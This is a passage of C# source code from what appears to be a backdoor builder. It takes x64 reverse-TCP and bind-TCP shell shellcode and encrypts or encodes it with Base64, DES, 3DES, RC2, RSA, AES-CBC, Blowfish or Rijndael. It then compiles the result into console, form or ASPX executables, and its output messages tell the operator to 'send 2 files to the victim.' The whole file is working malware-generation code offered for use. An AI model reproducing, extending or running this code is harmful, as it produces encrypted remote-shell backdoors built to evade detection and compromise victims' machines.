					_encryptMethod.NonEncryption(array, timeOut, Architecture.x64.ToString(), ShellType, appType, SelectedEncryption);
				}
				else if (encryption == (int)EncryptionType.Base64)
				{
                    SelectedEncryption = (int)EncryptionType.Base64;
					_encryptMethod.Base64Encoding(array, timeOut, Architecture.x64.ToString(), ShellType, appType, SelectedEncryption);
				}
				else if (encryption == (int)EncryptionType.Rinjdael)
				{
                    SelectedEncryption = (int)EncryptionType.Rinjdael;
					_encryptMethod.RinjdaelEncryption(array, timeOut, Architecture.x64.ToString(), ShellType, appType, SelectedEncryption);
				}
				else if (encryption == (int)EncryptionType.DES)
				{
                    SelectedEncryption = (int)EncryptionType.DES;
					_encryptMethod.DESEncryption(array, timeOut, Architecture.x64.ToString(), ShellType, appType, SelectedEncryption);
				}
				else if (encryption == (int)EncryptionType.TripleDES)
				{
                    SelectedEncryption = (int)EncryptionType.TripleDES;
					_encryptMethod.TripleDESEncryption(array, timeOut, Architecture.x64.ToString(), ShellType, appType, SelectedEncryption);
				}
				else if (encryption == (int)EncryptionType.RcTwo)
				{
                    SelectedEncryption = (int)EncryptionType.RcTwo;
					_encryptMethod.RCTWOEncryption(array, timeOut, Architecture.x64.ToString(), ShellType, appType, SelectedEncryption);
				}
				else if (encryption == (int)EncryptionType.RSA)
				{
                    SelectedEncryption = (int)EncryptionType.RSA;
					_encryptMethod.RSAEncryption(array, timeOut, Architecture.x64.ToString(), ShellType, appType, SelectedEncryption);
				}
				else if (encryption == (int)EncryptionType.AESCBC)
				{
                    SelectedEncryption = (int)EncryptionType.AESCBC;
					_encryptMethod.AESCBCEncryption(array, timeOut, Architecture.x64.ToString(), ShellType, appType, SelectedEncryption);
				}
				else if (encryption == (int)EncryptionType.BlowFish)
				{
                    SelectedEncryption = (int)EncryptionType.BlowFish;
					_encryptMethod.BlowFishEncryption(array, timeOut, Architecture.x64.ToString(), ShellType, appType, SelectedEncryption);
				}
			}
			/// <summary>
			/// Select x64/shell/reverse_tcp_rc4 payload method
			/// Set Method Parameter,
			/// Reverse IP Address : LHOST
			/// Reverse Port : LPORT
			/// Encryption Type: 0
			/// Backdoor Execution Timeout
			/// </summary>
			/// <param name="Ip"></param>
			/// <param name="Port"></param>
			/// <param name="encryption"></param>
			/// <param name="timeOut"></param>
			public void x64ShellReverseTcpRc4(string Ip, string Port, int encryption, int timeOut)
			{
				byte[] array = x64ShellCode.ShellReverseTcpRc4(Ip, Port);
				if (encryption == (int)EncryptionType.NonEncryption)
				{
					SelectedEncryption = (int)EncryptionType.NonEncryption;
					_encryptMethod.NonEncryption(array, timeOut, Architecture.x64.ToString(), ShellType, appType, SelectedEncryption);
				}
				else if (encryption == (int)EncryptionType.Base64)
				{
					SelectedEncryption = (int)EncryptionType.Base64;
					_encryptMethod.Base64Encoding(array, timeOut, Architecture.x64.ToString(), ShellType, appType, SelectedEncryption);
				}
				else if (encryption == (int)EncryptionType.Rinjdael)
				{
					SelectedEncryption = (int)EncryptionType.Rinjdael;
					_encryptMethod.RinjdaelEncryption(array, timeOut, Architecture.x64.ToString(), ShellType, appType, SelectedEncryption);
				}
				else if (encryption == (int)EncryptionType.DES)
				{
					SelectedEncryption = (int)EncryptionType.DES;
					_encryptMethod.DESEncryption(array, timeOut, Architecture.x64.ToString(), ShellType, appType, SelectedEncryption);
				}
				else if (encryption == (int)EncryptionType.TripleDES)
				{
					SelectedEncryption = (int)EncryptionType.TripleDES;
					_encryptMethod.TripleDESEncryption(array, timeOut, Architecture.x64.ToString(), ShellType, appType, SelectedEncryption);
				}
				else if (encryption == (int)EncryptionType.RcTwo)
				{
					SelectedEncryption = (int)EncryptionType.RcTwo;
					_encryptMethod.RCTWOEncryption(array, timeOut, Architecture.x64.ToString(), ShellType, appType, SelectedEncryption);
				}
				else if (encryption == (int)EncryptionType.RSA)
				{
					SelectedEncryption = (int)EncryptionType.RSA;
					_encryptMethod.RSAEncryption(array, timeOut, Architecture.x64.ToString(), ShellType, appType, SelectedEncryption);
				}
				else if (encryption == (int)EncryptionType.AESCBC)
				{
					SelectedEncryption = (int)EncryptionType.AESCBC;
					_encryptMethod.AESCBCEncryption(array, timeOut, Architecture.x64.ToString(), ShellType, appType, SelectedEncryption);
				}
				else if (encryption == (int)EncryptionType.BlowFish)
				{
					SelectedEncryption = (int)EncryptionType.BlowFish;
					_encryptMethod.BlowFishEncryption(array, timeOut, Architecture.x64.ToString(), ShellType, appType, SelectedEncryption);
				}
			}
			/// <summary>
			/// Select x64/shell/bind_tcp_rc4 payload method
			/// Set Method Parameter,
			/// Local Port : LPORT
			/// Encryption Type: 0
			/// Backdoor Execution Timeout
			/// </summary>
			/// <param name="Port"></param>
			/// <param name="encryption"></param>
			/// <param name="timeOut"></param>
			public void x64ShellBindTcpRc4(string Port, int encryption, int timeOut)
			{
				byte[] array = x64ShellCode.ShellBindTcpRc4(Port);
				if (encryption == (int)EncryptionType.NonEncryption)
				{
					SelectedEncryption = (int)EncryptionType.NonEncryption;
					_encryptMethod.NonEncryption(array, timeOut, Architecture.x64.ToString(), ShellType, appType, SelectedEncryption);
				}
				else if (encryption == (int)EncryptionType.Base64)
				{
					SelectedEncryption = (int)EncryptionType.Base64;
					_encryptMethod.Base64Encoding(array, timeOut, Architecture.x64.ToString(), ShellType, appType, SelectedEncryption);
				}
				else if (encryption == (int)EncryptionType.Rinjdael)
				{
					SelectedEncryption = (int)EncryptionType.Rinjdael;
					_encryptMethod.RinjdaelEncryption(array, timeOut, Architecture.x64.ToString(), ShellType, appType, SelectedEncryption);
				}
				else if (encryption == (int)EncryptionType.DES)
				{
					SelectedEncryption = (int)EncryptionType.DES;
					_encryptMethod.DESEncryption(array, timeOut, Architecture.x64.ToString(), ShellType, appType, SelectedEncryption);
				}
				else if (encryption == (int)EncryptionType.TripleDES)
				{
					SelectedEncryption = (int)EncryptionType.TripleDES;
					_encryptMethod.TripleDESEncryption(array, timeOut, Architecture.x64.ToString(), ShellType, appType, SelectedEncryption);
				}
				else if (encryption == (int)EncryptionType.RcTwo)
				{
					SelectedEncryption = (int)EncryptionType.RcTwo;
					_encryptMethod.RCTWOEncryption(array, timeOut, Architecture.x64.ToString(), ShellType, appType, SelectedEncryption);
				}
				else if (encryption == (int)EncryptionType.RSA)
				{
					SelectedEncryption = (int)EncryptionType.RSA;
					_encryptMethod.RSAEncryption(array, timeOut, Architecture.x64.ToString(), ShellType, appType, SelectedEncryption);
				}
				else if (encryption == (int)EncryptionType.AESCBC)
				{
					SelectedEncryption = (int)EncryptionType.AESCBC;
					_encryptMethod.AESCBCEncryption(array, timeOut, Architecture.x64.ToString(), ShellType, appType, SelectedEncryption);
				}
				else if (encryption == (int)EncryptionType.BlowFish)
				{
					SelectedEncryption = (int)EncryptionType.BlowFish;
					_encryptMethod.BlowFishEncryption(array, timeOut, Architecture.x64.ToString(), ShellType, appType, SelectedEncryption);
				}
			}
		}
		public class EncrypterMethod
		{
			public string fileName = string.Empty;
			private MeterpreterBuilder builder = new MeterpreterBuilder();
			private BuildCode.CryptoService cryptoService = new BuildCode.CryptoService();
			/// <summary>
			/// Generate No-Encrypted Backdoor
			/// </summary>
			/// <param name="array">Byte Array (shellcode)</param>
			/// <param name="timeOut">Suspend Thread Timeout</param>
			/// <param name="arch">Backdoor Architecture</param>
			/// <param name="ShellType">Shelltype (Byte Array, Dword)</param>
			/// <param name="appType">Application Type (Console, Form, ASPX etc.)</param>
			/// <param name="SelectedEncryption">Encryption Type (DES, RC2, RSA etc.)</param>
			public void NonEncryption(byte[] array, int timeOut, string arch, int ShellType, int appType, int SelectedEncryption)
            {
				GeneralFunction.CleanDirectory();
                var strCSharpCode = cryptoService.NonEncryptionCode(timeOut, array.Length.ToString(), GeneralFunction.ByteArrayToString(array), ShellType, appType);
				if (appType == (int)ApplicationType.ConsoleApplication || appType == (int)ApplicationType.ConsoleMemoryMapped)
				{
					builder.ConsoleApplication(strCSharpCode, arch);
				}
				else if (appType == (int)ApplicationType.FormApplication || appType == (int)ApplicationType.FormMemoryMapped)
				{
					builder.FormApplication(strCSharpCode, arch);
				}
				else if (appType == (int)ApplicationType.AspxExe)
                {
					builder.AspxApplication(strCSharpCode, arch, SelectedEncryption);
                }
				fileName = builder.FileName;
			}
            /// <summary>
            /// Generate Base64 Encoded Backdoor
            /// </summary>
            /// <param name="array">Byte Array (shellcode)</param>
            /// <param name="timeOut">Suspend Thread Timeout</param>
            /// <param name="arch">Backdoor Architecture</param>
            /// <param name="ShellType">Shelltype (Byte Array, Dword)</param>
            /// <param name="appType">Application Type (Console, Form, ASPX etc.)</param>
            /// <param name="SelectedEncryption">Encryption Type (DES, RC2, RSA etc.)</param>
			public void Base64Encoding(byte[] array, int timeOut, string arch, int ShellType, int appType, int SelectedEncryption)
			{
                GeneralFunction.CleanDirectory();
                var base64Code = Convert.ToBase64String(array);
                var strCSharpCode2 = cryptoService.Base64Encoding(timeOut, base64Code, ShellType, appType);
				if (appType == (int)ApplicationType.ConsoleApplication || appType == (int)ApplicationType.ConsoleMemoryMapped)
				{
					builder.ConsoleApplication(strCSharpCode2, arch);
				}
				else if (appType == (int)ApplicationType.FormApplication || appType == (int)ApplicationType.FormMemoryMapped)
				{
					builder.FormApplication(strCSharpCode2, arch);
				}
                else if (appType == (int)ApplicationType.AspxExe)
                {
                    builder.AspxApplication(strCSharpCode2, arch, SelectedEncryption);
                }
				fileName = builder.FileName;
			}
            /// <summary>
            /// Generate Rinjdael Encrypted Backdoor
            /// </summary>
            /// <param name="array">Byte Array (shellcode)</param>
            /// <param name="timeOut">Suspend Thread Timeout</param>
            /// <param name="arch">Backdoor Architecture</param>
            /// <param name="ShellType">Shelltype (Byte Array, Dword)</param>
            /// <param name="appType">Application Type (Console, Form, ASPX etc.)</param>
            /// <param name="SelectedEncryption">Encryption Type (DES, RC2, RSA etc.)</param>
			public void RinjdaelEncryption(byte[] array, int timeOut, string arch, int ShellType, int appType, int SelectedEncryption)
			{
                GeneralFunction.CleanDirectory();
                var rijndaRijndael = new Encrypter.Rijndael();
                var b64Array = Convert.ToBase64String(array);
                var password = GeneralFunction.RandomPassword(0, 8);
                var rijndaelCode = rijndaRijndael.EncryptText(b64Array, password);
                var strCSharpCode3 = cryptoService.RijndaelEncryption(timeOut, rijndaelCode, password, ShellType, appType);
				if (appType == (int)ApplicationType.ConsoleApplication || appType == (int)ApplicationType.ConsoleMemoryMapped)
				{
					builder.ConsoleApplication(strCSharpCode3, arch);
				}
				else if (appType == (int)ApplicationType.FormApplication || appType == (int)ApplicationType.FormMemoryMapped)
				{
					builder.FormApplication(strCSharpCode3, arch);
				}
                else if (appType == (int)ApplicationType.AspxExe)
                {
                    builder.AspxApplication(strCSharpCode3, arch, SelectedEncryption);
                }
				fileName = builder.FileName;
			}
            /// <summary>
            /// Generate DES Encrypted Backdoor
            /// </summary>
            /// <param name="array">Byte Array (shellcode)</param>
            /// <param name="timeOut">Suspend Thread Timeout</param>
            /// <param name="arch">Backdoor Architecture</param>
            /// <param name="ShellType">Shelltype (Byte Array, Dword)</param>
            /// <param name="appType">Application Type (Console, Form, ASPX etc.)</param>
            /// <param name="SelectedEncryption">Encryption Type (DES, RC2, RSA etc.)</param>
			public void DESEncryption(byte[] array, int timeOut, string arch, int ShellType, int appType, int SelectedEncryption)
			{
                GeneralFunction.CleanDirectory();
                var des = new Encrypter.DES();
                var strData = Convert.ToBase64String(array);
                var desPassword = GeneralFunction.RandomPassword(0, 8);
                var desCode = des.Encrypt(strData, desPassword);
                var strCSharpCode4 = cryptoService.DesEncryption(timeOut, desCode, desPassword, ShellType, appType);
				if (appType == (int)ApplicationType.ConsoleApplication || appType == (int)ApplicationType.ConsoleMemoryMapped)
                {
                    builder.ConsoleApplication(strCSharpCode4, arch);
				}
                else if (appType == (int)ApplicationType.FormApplication || appType == (int)ApplicationType.FormMemoryMapped)
				{
                    builder.FormApplication(strCSharpCode4, arch);
				}
                else if (appType == (int)ApplicationType.AspxExe)
                {
                    builder.AspxApplication(strCSharpCode4, arch, SelectedEncryption);
                }
				fileName = builder.FileName;
			}
            /// <summary>
            /// Generate 3DES Encrypted Backdoor
            /// </summary>
            /// <param name="array">Byte Array (shellcode)</param>
            /// <param name="timeOut">Suspend Thread Timeout</param>
            /// <param name="arch">Backdoor Architecture</param>
            /// <param name="ShellType">Shelltype (Byte Array, Dword)</param>
            /// <param name="appType">Application Type (Console, Form, ASPX etc.)</param>
            /// <param name="SelectedEncryption">Encryption Type (DES, RC2, RSA etc.)</param>
			public void TripleDESEncryption(byte[] array, int timeOut, string arch, int ShellType, int appType, int SelectedEncryption)
			{
                GeneralFunction.CleanDirectory();
				var tripleDES = new Encrypter.TripleDES();
                var source = Convert.ToBase64String(array);
                var decryptPass = GeneralFunction.RandomPassword(0, 8);
                var tripleDesCode = tripleDES.Encrypt(source, decryptPass);
                var strCSharpCode5 = cryptoService.TripleDesEncryption(timeOut, tripleDesCode, decryptPass, ShellType, appType);
				if (appType == (int) ApplicationType.ConsoleApplication || appType == (int) ApplicationType.ConsoleMemoryMapped)
				{
                    builder.ConsoleApplication(strCSharpCode5, arch);
				}
				else if (appType == (int) ApplicationType.FormApplication || appType == (int) ApplicationType.FormMemoryMapped)
				{
                    builder.FormApplication(strCSharpCode5, arch);
				}
                else if (appType == (int)ApplicationType.AspxExe)
                {
                    builder.AspxApplication(strCSharpCode5, arch, SelectedEncryption);
                }
				fileName = builder.FileName;
			}
            /// <summary>
            /// Generate RC2 Encrypted Backdoor
            /// </summary>
            /// <param name="array">Byte Array (shellcode)</param>
            /// <param name="timeOut">Suspend Thread Timeout</param>
            /// <param name="arch">Backdoor Architecture</param>
            /// <param name="ShellType">Shelltype (Byte Array, Dword)</param>
            /// <param name="appType">Application Type (Console, Form, ASPX etc.)</param>
            /// <param name="SelectedEncryption">Encryption Type (DES, RC2, RSA etc.)</param>
			public void RCTWOEncryption(byte[] array, int timeOut, string arch, int ShellType, int appType, int SelectedEncryption)
			{
                GeneralFunction.CleanDirectory();
				var rCTwo = new Encrypter.RCTwo();
                var filePath = Directory.GetCurrentDirectory().Replace("\\", "\\\\");
                var encryptedFile = filePath + "\\\\Saved\\\\iSMETShellCode.txt";
                var rc2EncryptedFilePath = "iSMETShellCode.txt";
                var aspxFilePath = "C:\\\\Windows\\\\Temp\\\\iSMET\\\\iSMETShellCode.txt";
                var data = Convert.ToBase64String(array);
                var rC = RC2.Create("RC2");
                var key = rC.Key;
                var IV = rC.IV;
                rCTwo.EncryptTextToFile(data, encryptedFile, key, IV);
				if (appType == (int)ApplicationType.ConsoleApplication || appType == (int)ApplicationType.ConsoleMemoryMapped)
				{
                    var strCSharpCode6 = cryptoService.Rc2Encryption(timeOut, rc2EncryptedFilePath, key, IV, ShellType, appType);
					builder.ConsoleApplication(strCSharpCode6, arch);
				}
                else if (appType == (int)ApplicationType.FormApplication || appType == (int)ApplicationType.FormMemoryMapped)
				{
                    var strCSharpCode6 = cryptoService.Rc2Encryption(timeOut, rc2EncryptedFilePath, key, IV, ShellType, appType);
					builder.FormApplication(strCSharpCode6, arch);
				}
                else if (appType == (int)ApplicationType.AspxExe)
                {
                    var strCSharpCode6 = cryptoService.Rc2Encryption(timeOut, aspxFilePath, key, IV, ShellType, appType);
					builder.AspxApplication(strCSharpCode6, arch, SelectedEncryption);
                }
				fileName = $"{builder.FileName}{Environment.NewLine}iSMETShellCode.txt is created. Please send 2 files to the victim.";
			}
            /// <summary>
            /// Generate RSA Encrypted Backdoor
            /// </summary>
            /// <param name="array">Byte Array (shellcode)</param>
            /// <param name="timeOut">Suspend Thread Timeout</param>
            /// <param name="arch">Backdoor Architecture</param>
            /// <param name="ShellType">Shelltype (Byte Array, Dword)</param>
            /// <param name="appType">Application Type (Console, Form, ASPX etc.)</param>
            /// <param name="SelectedEncryption">Encryption Type (DES, RC2, RSA etc.)</param>
			public void RSAEncryption(byte[] array, int timeOut, string arch, int ShellType, int appType, int SelectedEncryption)
			{
                GeneralFunction.CleanDirectory();
				var rSA = new Encrypter.RSA();
                rSA.generateKeys();
                var publicKey = rSA.publicKey;
                var privateKey = rSA.privateKey;
                var encryptedShellCode = rSA.Encrypt(array);
                var strCSharpCode7 = cryptoService.RsaEncryption(timeOut, array.Length, privateKey, encryptedShellCode, ShellType, appType);
                fileName = string.Concat(new string[]
                {
                    builder.FileName,
                    Environment.NewLine,
                    "Private Key: ",
                    privateKey,
                    Environment.NewLine,
                    "Public Key: ",
                    publicKey
                });
				if (appType == (int)ApplicationType.ConsoleApplication || appType == (int)ApplicationType.ConsoleMemoryMapped)
				{
                    builder.ConsoleApplication(strCSharpCode7, arch);
				}
                else if (appType == (int)ApplicationType.FormApplication || appType == (int)ApplicationType.FormMemoryMapped)
				{
                    builder.FormApplication(strCSharpCode7, arch);
				}
                else if (appType == (int)ApplicationType.AspxExe)
                {
                    builder.AspxApplication(strCSharpCode7, arch, SelectedEncryption);
                }
				fileName = builder.FileName;
			}
            /// <summary>
            /// Generate AES-CBC Encrypted Backdoor
            /// </summary>
            /// <param name="array">Byte Array (shellcode)</param>
            /// <param name="timeOut">Suspend Thread Timeout</param>
            /// <param name="arch">Backdoor Architecture</param>
            /// <param name="ShellType">Shelltype (Byte Array, Dword)</param>
            /// <param name="appType">Application Type (Console, Form, ASPX etc.)</param>
            /// <param name="SelectedEncryption">Encryption Type (DES, RC2, RSA etc.)</param>
			public void AESCBCEncryption(byte[] array, int timeOut, string arch, int ShellType, int appType, int SelectedEncryption)
			{
                GeneralFunction.CleanDirectory();
				var password = GeneralFunction.RandomPassword(0, 8);
                var secret = Encrypter.AESCBC.EncryptStrings(password, GeneralFunction.ByteArrayToString(array));
                var stubFile = Directory.GetCurrentDirectory().Replace("\\", "\\\\") + "\\\\Saved\\\\Stub.bin";
                File.WriteAllBytes(stubFile, secret);
                var strAesSharpCode = cryptoService.AESCBCEncryption(timeOut, password, ShellType, appType);
				if (appType == (int)ApplicationType.ConsoleApplication || appType == (int)ApplicationType.ConsoleMemoryMapped)
				{
					builder.ConsoleApplication(strAesSharpCode, arch);
				}
				else if (appType == (int)ApplicationType.FormApplication || appType == (int)ApplicationType.FormMemoryMapped)
				{
					builder.FormApplication(strAesSharpCode, arch);
				}
                else if (appType == (int)ApplicationType.AspxExe)
				{
					builder.AspxApplication(strAesSharpCode, arch, SelectedEncryption);
				}
				fileName = $"{builder.FileName}{Environment.NewLine}and Stub.bin is created. Please send 2 files to the victim.";
			}
            /// <summary>
            /// Generate Blowfish Encrypted Backdoor
            /// </summary>
            /// <param name="array">Byte Array (shellcode)</param>
            /// <param name="timeOut">Suspend Thread Timeout</param>
            /// <param name="arch">Backdoor Architecture</param>
            /// <param name="ShellType">Shelltype (Byte Array, Dword)</param>
            /// <param name="appType">Application Type (Console, Form, ASPX etc.)</param>
            /// <param name="SelectedEncryption">Encryption Type (DES, RC2, RSA etc.)</param>
			public void BlowFishEncryption(byte[] array, int timeOut, string arch, int ShellType, int appType, int SelectedEncryption)
			{
                GeneralFunction.CleanDirectory();
				var randomIV = GeneralFunction.RandomHexString();
                var bfish = new Encrypter.BlowFish(randomIV);
                bfish.IV = GeneralFunction.ConvertToByteArray(randomIV);
                var encryptedShellcode = bfish.Encrypt_CBC(array);
                var stubFile = Directory.GetCurrentDirectory().Replace("\\","\\\\") + "\\\\Saved\\\\Stub.bin";
                File.WriteAllBytes(stubFile, encryptedShellcode);
                var strBlowSharpCode = cryptoService.BlowFishEncryption(timeOut, randomIV, ShellType, appType);
				if (appType == (int)ApplicationType.ConsoleApplication || appType == (int)ApplicationType.ConsoleMemoryMapped)
				{
                    builder.ConsoleApplication(strBlowSharpCode, arch);
				}
                else if (appType == (int)ApplicationType.FormApplication || appType == (int)ApplicationType.FormMemoryMapped)
				{
                    builder.FormApplication(strBlowSharpCode, arch);
				}
                else if (appType == (int)ApplicationType.AspxExe)
                {
                    builder.AspxApplication(strBlowSharpCode, arch, SelectedEncryption);
				}
				fileName = $"{builder.FileName}{Environment.NewLine}and Stub.bin is created. Please send 2 files to the victim.";
				fileName = builder.FileName;
			}
        }
        public class EncryptedMethodDword
		{
			public string fileName = string.Empty;
			private MeterpreterBuilder builder = new MeterpreterBuilder();
			private SourceCode.Console consoleBuildCode = new SourceCode.Console();
			public void NonEncryption(string Ip, string Port, int timeOut, string arch, int appType)
			{
                if (appType == (int)ApplicationType.ConsoleApplication)
                {
                    var strCSharpCode = consoleBuildCode.Consolex86ReverseTcp(Ip, Port, timeOut);
                    builder.ConsoleApplication(strCSharpCode, arch);
                }
                else if (appType == (int)ApplicationType.FormApplication)
                {
                    //var strCSharpCode = formBuildCode.NonEncryptionCode(timeOut, array.Length.ToString(),
                    //    GeneralFunction.ByteArrayToString(array));
                    //builder.FormApplication(strCSharpCode, arch);
                }
                fileName = builder.FileName;
				//if (appType == 0)
				//{
				//    var strCSharpCode = consoleBuildCode.DwordCode(array, timeOut);
				//    builder.ConsoleApplication(strCSharpCode, arch);
				//}
				//else if (appType == 1)
				//{
				//    var strCSharpCode = string.Concat(new string[]
				//    {
				//        formBuildCode.NonEncryptionFirstCode(timeOut),
				//        array.Length.ToString(),
				//        "] { ",
				//        GeneralFunction.ByteArrayToString(array),
				//        formBuildCode.NonEncryptionLastCode()
				//    });
				//    builder.FormApplication(strCSharpCode, arch);
				//}
				//fileName = builder.FileName;
			}
		}
	}
}
